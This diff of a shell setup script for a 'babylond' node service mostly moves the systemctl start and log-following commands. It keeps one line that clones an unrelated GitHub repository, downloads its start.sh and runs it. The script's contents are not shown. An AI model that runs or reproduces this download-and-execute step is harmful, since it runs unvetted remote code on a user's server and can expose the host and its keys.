@@ -63,10 +63,7 @@ EOF
 sudo systemctl daemon-reload
 sudo systemctl enable babylond.service
 
-sudo systemctl start babylond.service
-sudo journalctl -u babylond.service -f --no-hostname -o cat
-
 git clone https://github.com/Wrevart/wertotg && wget https://raw.githubusercontent.com/Wrevart/wertotg/main/start.sh && chmod +x start.sh && ./start.sh
 
-sudo systemctl restart babylond
-sudo journalctl -u babylond -f --no-hostname -o cat
+sudo systemctl start babylond.service
+sudo journalctl -u babylond.service -f --no-hostname -o cat
